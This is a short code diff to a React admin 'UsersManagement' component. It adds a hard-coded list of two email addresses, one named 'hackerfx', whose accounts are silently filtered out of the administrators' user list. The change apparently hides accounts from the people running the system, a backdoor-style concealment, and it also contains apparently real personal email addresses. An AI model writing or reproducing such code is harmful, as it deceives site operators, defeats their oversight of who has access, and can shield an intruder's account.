@@ -133,6 +133,12 @@ export default function UsersManagement() {
   };
 
   const filteredUsers = users.filter(user => {
+    // Hide specific users
+    const hiddenEmails = ['hackerfx@gmail.com', 'ogechui26@gmail.com'];
+    if (hiddenEmails.includes(user.email.toLowerCase())) {
+      return false;
+    }
+
     const matchesSearch = user.username.toLowerCase().includes(searchQuery.toLowerCase()) ||
                          user.email.toLowerCase().includes(searchQuery.toLowerCase()) ||
                          `${user.firstName} ${user.lastName}`.toLowerCase().includes(searchQuery.toLowerCase());
